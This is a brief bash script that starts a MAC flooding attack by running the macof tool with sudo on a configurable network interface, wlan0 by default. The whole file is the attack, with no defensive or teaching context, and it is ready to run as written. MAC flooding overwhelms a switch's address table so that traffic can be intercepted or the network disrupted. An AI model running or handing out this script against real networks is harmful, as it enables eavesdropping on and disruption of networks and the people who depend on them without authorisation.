#!/bin/bash

# Interface to flood (change to your interface, e.g., eth0 or wlan0)
INTERFACE="wlan0"

echo "[*] Starting MAC flood on $INTERFACE"
sudo macof -i $INTERFACE
